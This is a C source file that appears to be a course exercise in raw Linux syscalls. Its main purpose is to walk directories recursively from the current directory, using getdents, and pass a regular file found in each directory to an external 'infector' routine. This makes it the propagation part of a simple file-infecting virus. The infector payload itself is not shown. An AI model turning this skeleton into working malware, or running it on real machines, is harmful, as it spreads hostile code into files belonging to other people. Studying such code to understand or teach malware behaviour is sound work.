#include <dirent.h>     /* Defines DT_* constants */
#include "util.h"

extern int system_call(int, ...);
extern void infector(char* path);

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                      /* length is actually (d_reclen - 2 -
                        offsetof(struct linux_dirent, d_name)) */
    /*
    char           pad;       // Zero padding byte
    char           d_type;    // File type (only since Linux
                              // 2.6.4); offset is (d_reclen - 1)
    */
};

#define BUF_SIZE 1024

#define SYSEXIT 0x01
#define SYSREAD 0x03
#define SYSWRITE 0x04
#define SYSOPEN 0x05
#define SYSGETDENTS 0x8d

#define STDIN  0 
#define STDOUT 1
#define STDERR 2

#define O_RDONLY            0
#define O_WRONLY            1
#define O_RDWR              2
#define O_CREAT          0x40
#define O_EXCL           0x80
#define O_NOCTTY        0x100
#define O_TRUNC         0x200
#define O_APPEND        0x400
#define O_NONBLOCK      0x800
#define O_DIRECTORY   0x10000

#define NULL (void*)0

#define TEST(message, rc) \
do { \
  if (rc < 0) { \
    perror(message, rc); \
  } \
} while (0)

char *err_names[] = {NULL, 
                    "EPERM", 
                    "ENOENT", 
                    "ESRCH", 
                    "EINTR",
                    "EIO", 
                    "ENXIO",
                    "E2BIG",
                    "ENOEXEC",
                    "EBADF", 
                    "ECHILD", 
                    "EAGAIN", 
                    "ENOMEM", 
                    "EACCES", 
                    "EFAULT", 
                    "ENOTBLK",
                    "EBUSY",	
                    "EEXIST", 
                    "EXDEV",	
                    "ENODEV", 
                    "ENOTDIR",
                    "EISDIR", 
                    "EINVAL", 
                    "ENFILE", 
                    "EMFILE", 
                    "ENOTTY", 
                    "ETXTBSY",
                    "EFBIG",	
                    "ENOSPC", 
                    "ESPIPE", 
                    "EROFS",	
                    "EMLINK", 
                    "EPIPE",	
                    "EDOM",	
                    "ERANGE"}; 

void perror(char* message, int rc) { 
  char err_msg[] = "Error: ";
  char code_msg[] = " (error code = ";
  system_call(SYSWRITE, STDERR, err_msg, sizeof(err_msg));
  system_call(SYSWRITE, STDERR, message, strlen(message));
  system_call(SYSWRITE, STDERR, code_msg, sizeof(code_msg));
  char* rc_str = err_names[-rc]; 
  system_call(SYSWRITE, STDERR, rc_str, strlen(rc_str));
  system_call(SYSWRITE, STDERR, ")", 1);
  system_call(SYSWRITE, STDERR, "\n", 1);
}

void sys_exit(int code) {
  system_call(SYSEXIT, code);
}

int open(char* path, int flags, int mode) {
  int rc = system_call(SYSOPEN, path, flags, mode);
  TEST("Open", rc);
  return rc;
}

int read(int fd, void* buf, int len) {
  int rc = system_call(SYSREAD, fd, buf, len);
  TEST("Read", rc);
  return rc;
}

int write(int fd, void* buf, int len) {
  int rc = system_call(SYSWRITE, fd, buf, len);
  TEST("Write", rc);
  return rc;
}

int getdents(int fd, void* buf, int len) {
  int rc = system_call(SYSGETDENTS, fd, buf, len);
  TEST("Getdents", rc);
  return rc;
}

int print(char* message) {
  return write(STDOUT, message, strlen(message));
}

/* Given a dest directory and a subdirectory, concatenate the
subdirectory onto the dest with a slash-separator 
*/
char *dircat(char *dir, char *subdir) {
  strcat(dir, "/");
  strcat(dir, subdir);
  return dir;
}

void infect(char *path) {
  infector(path);
}

void find_file(char* dir) {
  int fd, getdents_rc;
  char buf[BUF_SIZE];
  struct linux_dirent *curr_dirent;
  int buffer_pos;
  char *target = NULL;
  
  fd = open(dir, O_RDONLY, 0777); /* Open "dir" */ 
  getdents_rc = getdents(fd, buf, 1024);  /* Execute getdents syscall */

  if (getdents_rc <= 0) {
      sys_exit(0x55);
  }

  /* Iterate all dirent objects */
  for (buffer_pos = 0; buffer_pos < getdents_rc; buffer_pos += curr_dirent->d_reclen) {
      curr_dirent = (struct linux_dirent *) (buf + buffer_pos);
      char* type = buf + buffer_pos + curr_dirent->d_reclen - 1;
      char intType = *type;

      if (strncmp("..", curr_dirent->d_name, 2) == 0 || 
          strncmp(".", curr_dirent->d_name, 1) == 0) {
            continue;
      }

      if (intType == 8) {
        /* store its name in "target" */
        target = curr_dirent->d_name;
      }
      else if (intType == 4) {
        /* print its name, type and record-length and set "target" to NULL */
        /* and recursively call find_file for this subdirectory */
        target = NULL;
        print(curr_dirent->d_name);
        print(itoa(intType));
        print(itoa(curr_dirent->d_reclen));
        find_file(dircat(dir, curr_dirent->d_name));

        break;
      } 
  }
  /* Infect "target" if it's not NULL */
  if (target != NULL) {
    infect(dircat(dir, target));
  }
}

int main(int argc, char *argv[])
{
  char path[1024*100];
  path[0] = '.';
  path[1] = '\0';
  find_file(path);
  return 0;
}
